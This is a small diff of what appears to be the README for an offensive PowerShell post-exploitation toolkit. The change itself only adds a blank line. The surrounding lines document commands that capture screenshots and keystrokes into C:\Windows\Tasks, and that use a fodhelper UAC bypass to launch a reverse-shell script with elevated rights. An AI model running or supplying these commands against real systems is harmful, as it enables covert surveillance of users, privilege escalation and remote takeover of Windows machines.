@@ -28,6 +28,7 @@ C:\Users\Administrator\Desktop> Invoke-Screenshot -Path "C:\Windows\Tasks\"
 C:\Users\Administrator\Desktop> Invoke-KeyStrokeCapture -DurationInSeconds 30 -OutputPath C:\Windows\Tasks\keystrokes.txt
 ```
 5. **Bypass UAC to run any program in elevated context. Default program powershell.exe**
+
 This function is taken from https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 all credit goes to netbiosX :)
 ```powershell
 C:\Users\Vlex\Desktop> Invoke-FodHelperBypass -program "C:\Windows\Tasks\reverse-shell.ps1"
